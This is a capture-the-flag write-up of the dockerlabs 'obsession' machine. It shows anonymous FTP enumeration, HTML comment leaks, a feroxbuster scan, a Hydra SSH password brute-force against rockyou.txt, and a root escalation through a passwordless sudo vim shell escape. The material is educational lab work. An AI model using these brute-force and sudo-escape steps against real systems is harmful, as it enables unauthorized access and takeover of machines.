# obsession

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| obsession | Juan | Very Easy | dockerlabs |

**Summary:** The obsession machine exposed three services: an anonymous FTP server, an OpenSSH daemon, and an Apache web application. The FTP service permitted unauthenticated access and contained two plaintext files that, read together, established a thematic context around a character named "Russoski" and subtly alluded to dangerously permissive system settings. The web application's HTML source contained an embedded developer comment admitting that the same username was reused across every service. A directory brute-force scan with feroxbuster then uncovered a publicly accessible `/backup/backup.txt` file that confirmed the username as `russoski` and even included a self-deprecating note acknowledging the credential should be rotated. Armed with a confirmed username, a standard Hydra SSH brute-force against `rockyou.txt` recovered the weak password `iloveme` in under two minutes. Once authenticated as `russoski`, a `sudo -l` query revealed that the account could execute `/usr/bin/vim` as root without a password. Using the well-documented GTFOBins technique, `vim` was invoked with an embedded shell escape (`-c ':!/bin/bash'`), which spawned an interactive root shell directly from within the editor process. The privilege escalation required no exploit, no compiled binary, and no custom payload: the misconfigured sudo entry did all the work.

---

## Reconnaissance

The machine was deployed through the standard dockerlabs script and assigned IP address `172.17.0.2`.

**1.** Deploy the target container and record the assigned address:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/obsession]
└─$ sudo bash auto_deploy.sh obsession.tar
[sudo] password for ouba:

                        ##        .
                  ## ## ##       ==
               ## ## ## ##      ===
           /""""""""""""""""\___/ ===
      ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
           \______ o          __/
             \    \        __/
              \____\______/

  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]



Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2.** Run a full-port versioned Nmap scan to map the complete attack surface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 08:39 WIB
Nmap scan report for 172.17.0.2
Host is up (0.000012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
```

Three services were identified: **vsftpd 3.0.5** on TCP 21 with anonymous login already confirmed by Nmap's scripts, **OpenSSH 9.6p1** on TCP 22, and **Apache 2.4.58** on TCP 80 serving a site titled "Russoski Coaching". The anonymous FTP access was an immediate lead: Nmap had already enumerated two files sitting in the root share, `chat-gonza.txt` and `pendientes.txt`.

---

## FTP Enumeration: Extracting Intelligence from Plaintext Files

**3.** Connect to the FTP service as `anonymous` and download all available files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ ftp $ip
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||21266|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        104          4096 Jun 18  2024 .
drwxr-xr-x    2 0        104          4096 Jun 18  2024 ..
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp> mget *
mget chat-gonza.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||10012|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |*********************************************|   667      242.95 KiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (183.74 KiB/s)
mget pendientes.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||35286|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |*********************************************|   315        3.19 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (582.60 KiB/s)
```

**4.** Read both files to extract any intelligence they contain:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ cat chat-gonza.txt
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ cat pendientes.txt
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```

Both files were written entirely in Spanish. `chat-gonza.txt` was a casual chat log between a user calling themselves "Russoski" and a contact named "Gonza", casually referencing a video file stored "in a safe path" on the machine. `pendientes.txt` was a personal to-do list that, critically, included a fourth item admitting that certain "permissions" on the system were not entirely secure. This was a strong signal that a misconfigured sudo or SUID binary would likely surface post-compromise.

---

## Web Application Analysis and Source Code Inspection

**5.** Probe the web server root and inspect the full HTTP response including the HTML source:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2026 01:41:14 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Tue, 25 Jun 2024 09:09:22 GMT
ETag: "1458-61bb340e35480"
Accept-Ranges: bytes
Content-Length: 5208
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Russoski Coaching</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <section class="full">
        <div class="full-inner">
            <div class="content">
                <h1>The Aesthetic Dream</h1>
                <a href="#formulario">TRANSFORMA TU FÍSICO YA MISMO</a>
            </div>
        </div>
    </section>
    <p>Bienvenido. Soy Informático, pero sobre todo, soy <strong>entrenador personal</strong> con más de 5
        años de experiencia en el entrenamiento con cargas y nutrición, con <strong>certificado de
            profesionalidad</strong> como Monitor de Musculación y Fitness. Para conocerme un poco más, <a href="https://russ0ski.github.io/MyHackingRoad/"
            target="_blank">entra aquí</a>.</p>
    <p>Estoy dispuesto a utilizar todos mis conocimientos con el objetivo de <strong>cambiar tu físico para
            bien</strong>. ¿Estás dispuesto a conseguir tu mejor versión y vivir la vida que siempre quisiste?.
        <strong>Sólo tienes que dar el paso</strong> y dejarme asesorarte en tu camino hacía la
        <strong>estética</strong>.
    </p>
    <p>Aprovecha mi nueva oferta por <strong>Black Friday</strong> y obtén un 45% de descuento durante los próximos 3
        meses en tus planes de nutrición y entrenamiento, sólo disponible por <strong>tiempo limitado</strong>.
        Atrévete, no te arrepentirás <strong>cuando te mires al espejo y sonrías</strong>.</p>
    <section class="full4">
        <div class="full-inner4">
            <div class="content5">
                <ul>
                    <li>
                        Resultados 100% garantizados, si no estás conforme te devolvemos parte del dinero.
                    </li>
                    <li>
                        La primera semana de prueba es gratuita, sólo tienes que rellenar nuestro formulario.
                    </li>
                    <li>
                        Asesoramiento online y también presencial (sólo aplicable si eres mujer).
                    </li>
                    <li>
                        Me adapto a tu nivel físico para brindarte el mejor servicio, sin riesgo de lesiones.
                    </li>
                    <li>
                        Me adapto a tu economía para ofrecer el mejor plan de nutrición que puedas permitirte.
                    </li>
                </ul>
            </div>
        </div>         <! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
    </section>
    <section class="full3">
        <div class="full-inner3">
            <div class="content3">
                <fieldset>
                    <a id="formulario">
                        <h3>Consigue tu asesoría personalizada:</h3>
                    </a>
                    <form action="http://172.17.0.2/.formrellyrespexit.html" method="get">
                        <label>
                            Nombre:
                            <input name="nombre" type="text" placeholder="Introduce tu nombre" />
                        </label>
                        <br>
                        <br>
                        <label>
                            Apellido:
                            <input name="apellido" type="text" placeholder="Introduce tus apellidos" />
                        </label>
                        <br>
                        <br>
                        <label>
                            Teléfono:
                            <input name="telefono" type="tel" placeholder="Introduce tu número" />
                        </label>
                        <br>
                        <br>
                        <label>
                            Email:
                            <input name="email" type="email" placeholder="Introduce tu correo" />
                        </label>
                        <br>
                        <br>
                        <label for="somatotipo">Somatotipo:</label>
                        <select name="somatotipo">
                            <option>Hectomorfo</option>
                            <option>Mesomorfo</option>
                            <option>Endomorfo</option>
                        </select>
                        <br>
                        <br>
                        <input name="llamada a la accion" type="submit" value="CAMBIAR MI VIDA A MEJOR AHORA" />
                        <input name="campaign" type="hidden" value="BLACKFRIDAY" />
                    </form>
                    <br>
                </fieldset>
            </div>
        </div>
    </section>
    <footer>
        <section class="full2">
            <div class="full-inner2">
                <div class="content4">
                    <br>
                    <h4>Copyright Russoski © 2024</h4>
                    <a href="mailto:russoski@dockerlabs.es" target="_blank">russoski@dockerlabs.es</a>
                    <br>
                    <br>
                    <br>
                </div>
            </div>
        </section>
    </footer>
</body>

</html>
```

The page belonged to "Russoski Coaching", a personal training business. The developer had left an HTML comment embedded within the page body that read:

```
<! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
```

Translated: *"Using the same username for all my services, I'll be able to remember it easily."* This was a definitive confirmation that a single, shared username was reused across FTP, SSH, and the web application. The footer also exposed an email address confirming the username: `russoski@dockerlabs.es`.

**6.** Verify the hidden form action endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ curl -i http://172.17.0.2/.formrellyrespexit.html
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2026 01:44:46 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Tue, 18 Jun 2024 02:24:19 GMT
ETag: "2db-61b20c76d5ac0"
Accept-Ranges: bytes
Content-Length: 731
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario Recibido</title>
</head>
<body>
    <h3>Has Tomado Una Gran Decisión</h3>
    <p>-------------------------------------------------------------------------------------------------------------------</p>
    <p>Gracias por enviar tu solicitud! Nos pondremos en contacto contigo pronto</p>
    <p>para informarte de precios y programas de entrenamiento y nutrición.</p>
    <p>Atentamente: el equipo de Russoski Coaching.</p>
    <p>-------------------------------------------------------------------------------------------------------------------</p>
</body>
</html>
```

The form submission page was a static thank-you page with no further leads. Attention shifted to directory brute-forcing to uncover any hidden paths on the server.

---

## Directory Brute-Force with feroxbuster

**7.** Run feroxbuster with a medium wordlist and a broad extension set to enumerate hidden content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ feroxbuster -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,jpg,html,zip,bak,pem,log,yml,js

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2/
 🚩  In-Scope Url          │ 172.17.0.2
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, jpg, html, zip, bak, pem, log, yml, js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       16l       51w      731c http://172.17.0.2/.formrellyrespexit.html
200      GET      158l      358w     3292c http://172.17.0.2/style.css
200      GET      118l      384w     5208c http://172.17.0.2/
200      GET      118l      384w     5208c http://172.17.0.2/index.html
301      GET        9l       28w      309c http://172.17.0.2/backup => http://172.17.0.2/backup/
200      GET        1l        8w       61c http://172.17.0.2/backup/backup.txt
301      GET        9l       28w      312c http://172.17.0.2/important => http://172.17.0.2/important/
200      GET       37l      287w     2417c http://172.17.0.2/important/important.md
```

Two previously unknown paths were discovered: `/backup/backup.txt` and `/important/important.md`. Both were immediately fetched.

**8.** Retrieve the contents of both newly discovered files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ curl -s $url/important/important.md -i
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2026 01:48:51 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Mon, 17 Jun 2024 03:15:23 GMT
ETag: "971-61b0d6036e8c0"
Accept-Ranges: bytes
Content-Length: 2417
Content-Type: text/markdown

                               -------------------------------------------------------

                                                 MANIFIESTO HACKER
                                             La Conciencia de un Hacker

                             Uno más ha sido capturado hoy, está en todos los periódicos.

  "Joven arrestado en Escándalo de Crimen por Computadora", "Hacker arrestado luego de traspasar las barreras de seguridad de un banco.."

Malditos muchachos. Todos son iguales. Pero tú, en tu psicología de tres partes y tu técnocerebro de 1950, has alguna vez observado detrás
                                              de los ojos de un Hacker?

         Alguna vez te has preguntado qué lo mueve, qué fuerzas lo han formado, cuáles lo pudieron haber moldeado?

                                           Soy un Hacker, entra a mi mundo..

         El mío es un mundo que comienza en la escuela.. Soy más inteligente que la mayoría de los otros muchachos,
                                       esa basura que ellos nos enseñan me aburre..

                                         Malditos sub realizados. Son todos iguales.

  Estoy en la preparatoria. He escuchado a los profesores explicar por decimoquinta vez como reduciruna fracción. Yo lo entiendo.

                          "No, Srta. Smith, no le voy a mostrar mi trabajo, lo hice en mi mente..
                             "Maldito muchacho. Probablemente se lo copió. Todos son iguales.

                Hoy hice un descubrimiento. Encontré una computadora. Espera un momento, esto es lo máximo.
                        Esto hace lo que yo le pida. Si comete un error es porque yo me equivoqué.

     No porque no le gustó.. o se siente amenazada por mí.. o piensa que soy un engreído.. o no le gusta enseñar y no
                  debería estar aquí.. Maldito muchacho. Todo lo que hace es jugar. Todos son iguales.

  Y entonces ocurrió.. una puerta abierta al mundo.. corriendo a través de las lineas telefónicas como la heroína a través de
      las venas de un adicto, se envía un pulso electrónico, un refugio para las incompetencias del día a día es buscado..
                                          una tabla de salvación es encontrada.

                               --------------------------------------------------------
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ curl -s $url/backup/backup.txt -i
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2026 01:49:02 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Mon, 24 Jun 2024 23:55:18 GMT
ETag: "3d-61bab83642580"
Accept-Ranges: bytes
Content-Length: 61
Content-Type: text/plain

Usuario para todos mis servicios: russoski (cambiar pronto!)
```

The `/important/important.md` file contained a Spanish translation of the famous "Hacker Manifesto" ("The Conscience of a Hacker"), serving as thematic decoration with no actionable intelligence. The `/backup/backup.txt` file, however, was the decisive find. It read: *"Username for all my services: russoski (change soon!)"*. This confirmed the username across all services, corroborating both the HTML comment and the email address found earlier. The parenthetical acknowledgment that the credential needed rotating made the security situation even more ironic.

---

## SSH Credential Recovery via Brute Force

With a confirmed username of `russoski`, Hydra was launched against the SSH service using the standard `rockyou.txt` wordlist.

**9.** Brute-force the SSH service with Hydra:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-11 08:52:13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 75.00 tries/min, 75 tries in 00:01h, 14344324 to do in 3187:38h, 4 active
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-11 08:53:57
```

Valid SSH credentials were recovered in under two minutes: username `russoski`, password `iloveme`. The weak, sentimental password near the top of `rockyou.txt` required no wordlist manipulation whatsoever.

---

## Initial Access as `russoski`

**10.** Connect via SSH and enumerate the account's identity and system context:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/obsession]
└─$ ssh russoski@$ip
russoski@172.17.0.2's password:
...
russoski@f6f46800a6cd:~$ id
uid=1001(russoski) gid=1001(russoski) groups=1001(russoski),100(users)
russoski@f6f46800a6cd:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
russoski:x:1001:1001:Juan Carlos,,,,Aesthetics Over Everything:/home/russoski:/bin/bash
```

The account's GECOS field read `Aesthetics Over Everything`, a fitting flourish for the machine's personal-trainer theme. Three accounts were present with valid shells: `root`, `ubuntu`, and `russoski`. With the to-do list's hint about insecure permissions still in mind, a sudo query was the logical next step.

**11.** Check the sudo policy for `russoski`:

```bash
russoski@f6f46800a6cd:~$ sudo -l
Matching Defaults entries for russoski on f6f46800a6cd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on f6f46800a6cd:
    (root) NOPASSWD: /usr/bin/vim
```

The misconfiguration confirmed in `pendientes.txt` was now clearly visible: `russoski` could run `/usr/bin/vim` as root without providing a password. `vim` is a well-known GTFOBins vector precisely because it supports executing arbitrary shell commands from within the editor through the `:!` escape sequence.

---

## Privilege Escalation via vim GTFOBins Shell Escape

**12.** Invoke `vim` as root and immediately escape to an interactive bash shell using the `-c` flag:

```bash
russoski@f6f46800a6cd:~$ sudo /usr/bin/vim -c ':!/bin/bash'

root@f6f46800a6cd:/home/russoski# cd
root@f6f46800a6cd:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
f6f46800a6cd
root@f6f46800a6cd:~# ls -la
total 36
drwx------ 1 root root 4096 Jun 18  2024 .
drwxr-xr-x 1 root root 4096 Mar 11 02:37 ..
-rw------- 1 root root  123 Jun 25  2024 .bash_history
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x 1 root root 4096 Jun 17  2024 .local
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 Jun 17  2024 .ssh
-rw------- 1 root root  558 Jun 18  2024 .viminfo
-rw-r--r-- 1 root root   84 Jun 17  2024 Video-Nagore-Fernandez.txt
root@f6f46800a6cd:~# cat Video-Nagore-Fernandez.txt
Al fin lo terminé! es tan hermosa.. <3

https://www.youtube.com/shorts/_v8GzGReTAk
```

The `-c ':!/bin/bash'` flag instructed `vim` to execute the ex command `:!/bin/bash` upon startup, forking a bash process with the same effective UID as the `vim` process itself, which was root. A full root shell was obtained immediately, without a single moment inside the editor's interactive UI. The chained `id;whoami;hostname` command confirmed `uid=0(root)` on container `f6f46800a6cd`.

The root home directory contained the file referenced in the earlier chat log: `Video-Nagore-Fernandez.txt`, which contained the note *"I finally finished it! She is so beautiful"* followed by a YouTube Shorts URL, closing the narrative loop that began in the FTP chat log.

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan with Nmap identified three open services: vsftpd 3.0.5 on port 21 with anonymous login enabled (including a directory listing of two files), OpenSSH 9.6p1 on port 22, and Apache 2.4.58 on port 80 serving a personal training website titled "Russoski Coaching".

2. **Vulnerability Discovery**: Anonymous FTP access exposed `chat-gonza.txt` and `pendientes.txt`. The chat log introduced the character "Russoski" and a file stored on the machine, while the to-do list explicitly warned of insecure permission settings. Inspection of the web page's HTML source revealed a developer comment admitting that a single username was reused across all services, and the footer confirmed the email `russoski@dockerlabs.es`.

3. **Exploitation**: A feroxbuster directory scan discovered `/backup/backup.txt`, which contained a plaintext note confirming the username `russoski` and acknowledging it should be changed. Hydra was used to brute-force SSH with this username against `rockyou.txt`, recovering the weak password `iloveme` in under two minutes.

4. **Internal Enumeration**: After SSH login as `russoski`, the `/etc/passwd` file confirmed three user accounts with interactive shells. The `sudo -l` query revealed a critical misconfiguration: the account could execute `/usr/bin/vim` as root without a password, exactly as foreshadowed by the to-do list recovered from the FTP server.

5. **Privilege Escalation**: Using the standard GTFOBins technique for `vim`, the command `sudo /usr/bin/vim -c ':!/bin/bash'` was executed. This launched `vim` as root and immediately used the ex command `:!` to fork a bash shell, inheriting root's effective UID. Full root access was confirmed, and the file `Video-Nagore-Fernandez.txt` found in root's home directory closed the narrative thread introduced in the initial FTP file.
